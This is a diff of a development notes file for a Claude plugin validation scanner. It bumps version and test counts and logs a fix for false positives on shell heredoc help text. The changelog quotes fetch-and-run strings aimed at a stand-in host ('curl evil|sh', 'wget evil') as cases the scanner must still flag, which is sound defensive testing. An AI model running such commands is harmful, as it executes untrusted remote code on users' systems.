@@ -19,12 +19,12 @@ marketplace. Repo: `github.com/Emasoft/claude-plugins-validation`.
 
 | Thing | Count | Where / how to list |
 |---|---|---|
-| **version** | `2.126.21` | `.claude-plugin/plugin.json` → `version` |
+| **version** | `2.126.22` | `.claude-plugin/plugin.json` → `version` |
 | **commands** | **13** | `ls commands/*.md` — 10×`cpv-batch-*`, `cpv-main-menu`, `cpv-pre-install-scan`, `the-skills-menu-create` |
 | **agents** | **15** | `ls agents/*.md` |
 | **skills** | **46** | `ls -d skills/*/` |
 | **scripts** | **115** | `ls scripts/*.py` (25 `validate_*.py` + management/engine/CLI; `_skillaudit_*_context.py` per-language classifiers; `cpv_dependency_schema.py` SSOT dep-schema) |
-| **test files** | **324** | `ls tests/test_*.py`; ~9252 tests |
+| **test files** | **325** | `ls tests/test_*.py`; ~9261 tests |
 
 **The 15 agents:** cache-optimizer-agent · cpv-doctor-agent ·
 cpv-main-menu-agent · cpv-spark · cpv · marketplace-fixer · plugin-creator ·
@@ -122,6 +122,28 @@ uv run python scripts/publish.py --patch   # | --minor | --major
 8. **Reports** go under `reports/` and `reports_dev/` (BOTH gitignored).
 
 ## Open issues snapshot (update as they close)
+
+**v2.126.22 — closed #83.5** (skillaudit execution-class FPs on static PRINT-heredoc
+help-text in `.sh` files — `cat <<USAGE … USAGE` / `cat >&2 <<EOF` blocks hold
+printed usage strings, never executed, yet CMD_INJECTION/SUPPLY_CHAIN/etc. fired
+on the command-like text; the pre-existing print-heredoc detector already
+DEMOTED to `safe_doc`/NIT but NIT still blocks `--strict`). **Investigation
+(lesson, 3rd time) showed it's NOT a from-scratch parser:** the heredoc detector
+plus the `safe_doc` demote already exist in `_skillaudit_shell_context.py` —
+the fix just promotes `safe_doc`→`safe_literal` for the INERT case. FIX: track
+the heredoc delimiter's quote flag (`<<'EOF'` disables ALL expansion); for an
+EXECUTION-class rule, a QUOTED heredoc body → `safe_literal`, and an UNQUOTED
+body line with NO command substitution (`$(…)`/backtick, new
+`_SHELL_HEREDOC_CMD_SUBST_RE`) → `safe_literal`. **FN-safety crux:** an UNQUOTED
+body line WITH `$(…)`/backtick interpolates+runs → stays `safe_doc` (visible);
+NON-exec-class (prose-vector PROMPT_INJECT/etc.) rules keep `safe_doc` (printed
+injection text can still reach an agent). Verified two-sided through the REAL
+scanner (baseline 9 → 5: `brew install` in quoted + unquoted-plain heredocs
+suppressed; `$(curl evil|sh)` + `` `wget evil` `` inside the unquoted heredoc AND
+the real `curl evil|sh` outside it ALL still fire). +9 new tests; updated 3
+`test_issue_41` assertions that pinned the old `safe_doc` (now `safe_literal`).
+This is one of the #83 umbrella's 6 shapes (#83.5); the umbrella stays open for
+the others.
 
 **v2.126.21 — closed #102** (skillaudit JWT_VULN FP on a code-review plugin's
 lens/checklist files — `*.lens.md`/scenario docs necessarily ENUMERATE JWT
